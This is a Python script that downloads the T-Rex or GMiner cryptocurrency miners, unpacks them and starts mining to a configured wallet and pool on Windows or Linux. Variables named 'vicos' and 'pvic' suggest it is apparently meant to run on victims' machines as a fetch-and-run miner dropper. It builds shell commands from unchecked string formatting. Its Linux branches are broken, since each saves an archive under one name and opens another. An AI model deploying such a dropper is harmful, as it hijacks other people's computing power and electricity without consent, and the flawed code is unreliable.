import requests
import zipfile
import os
import subprocess
import tarfile


### customized variables
### linux or windows
vicos = ""
gpu = ""
"""
format for nvidia : stratum+tcp://ru-eth.hiveon.net:4444
format for amd : ru-eth.hiveon.net:4444
"""
server = ""
yourwallet = ""
"""
Supported Algorithms


For Nvidia Users:
ethash
autolykos2
firopow
kawpow
etchash


For AMD Users:
ethash
etchash
cortex : cuckoocortex
144_5 --pers BgoldPoW : bitcoin gold
144_5 --pers auto : bitcoinz
kawpow 
aeternity
125_4 : flux
beamhash
grin32
"""
algorithm = ""





if(vicos == "windows"):
    if(gpu == "nvidia"):
        url = "https://github.com/trexminer/T-Rex/releases/download/0.24.7/t-rex-0.24.7-win.zip"
    elif(gpu == "amd"):
        url = "http://gminer.pro/downloads?res=gminer_2_71_windows64.zip"

    else:
        print("gpu name incorrect")





    r = requests.get(url, allow_redirects=True)
    open('trex.zip', 'wb').write(r.content)




    print('getcwd:      ', os.getcwd())

    with zipfile.ZipFile("{}/trex.zip".format(os.getcwd()), 'r') as zip_ref:
        zip_ref.extractall(os.getcwd())

    if(gpu == "amd"):
        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && miner --algo {3} --server {2} --user {1} --worker xsinsinati5".format(os.getcwd(), yourwallet, server, algorithm)], shell = True)
    elif(gpu == "nvidia"):
        p = subprocess.Popen(["start", "cmd", "/k", "cd {0} && t-rex -a {3} -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server, algorithm)], shell = True)



### now time for the better os

elif(vicos == "linux"):
    if (gpu == "nvidia"):
        url = "https://github.com/trexminer/T-Rex/releases/download/0.24.7/t-rex-0.24.7-linux.tar.gz"
        r = requests.get(url, allow_redirects=True)
        open('trex.tar.gz', 'wb').write(r.content)
        with tarfile.open('trex.tar.xz') as f:
            f.extractall('.')
    elif (gpu == "amd"):
        url = "http://gminer.pro/downloads?res=gminer_2_72_linux64.tar.xz"
        r = requests.get(url, allow_redirects=True)
        open('miner.tar.xz', 'wb').write(r.content)
        file = tarfile.open('miner.tar.gz')
        file.extractall('./{}'.format(os.getcwd()))
        file.close()
    else:
        print("gpu name incorrect")



    if (gpu == "amd"):
        pvic = "cd {0} && ./miner --algo {3} --server {2} --user {1}.sinsinati5".format(os.getcwd(), yourwallet, server, algorithm)
        os.system(pvic)
    elif (gpu == "nvidia"):
        pvic = "cd {0} && ./t-rex -a {3} -o {2} -u {1} -p x -w sinsinati5".format(os.getcwd(), yourwallet, server, algorithm)
        os.system(pvic)

else:
    print("os name incorrect")
